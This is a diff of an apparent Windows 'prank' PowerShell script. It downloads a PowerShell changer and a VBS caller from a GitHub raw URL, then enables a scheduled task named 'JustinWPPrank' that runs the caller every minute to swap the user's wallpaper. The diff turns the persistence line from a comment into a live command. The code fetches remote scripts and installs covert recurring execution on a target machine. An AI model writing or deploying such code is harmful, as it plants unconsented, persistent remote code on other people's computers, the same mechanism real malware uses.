@@ -8,6 +8,8 @@ $githubUrl = "https://raw.githubusercontent.com/mxcezl/Justin-Hack-Windows/maste
 $imagesUrl = "$githubUrl/images/"
 $changerName = "changer.ps1"
 $changerLocalPath = "$jhPath\$changerName"
+$changerCallerName = "jhcaller.vbs"
+$changerCallerLocalPath = "$jhPath\$changerCallerName"
 
 # Create dir if not exists and hide output
 if(!(Test-Path "$jhPath\imgs")){
@@ -16,7 +18,8 @@ if(!(Test-Path "$jhPath\imgs")){
 
 # Download runner & changer files
 $client = new-object System.Net.WebClient
-$client.DownloadFile("$githubUrl/$changerName", $changerLocalPath)
+$client.DownloadFile("$githubUrl/changer/$changerName", $changerLocalPath)
+$client.DownloadFile("$githubUrl/changer/$changerCallerName", $changerCallerLocalPath)
 
 # Download images from GitHub
 $imagesDir = "$env:userprofile\jh\imgs"
@@ -26,4 +29,4 @@ foreach($imageName in $imagesName){
 }
 
 # Use task manager to set random wallpaper every x minutes
-#schtasks /create /sc minute /mo 1 /tn "JustinWPPrank" /tr "powershell.exe -windowstyle Hidden -nologo -file $jhPath\$changerName" /f
+schtasks /create /sc minute /mo 1 /tn "JustinWPPrank" /tr "$changerCallerLocalPath"
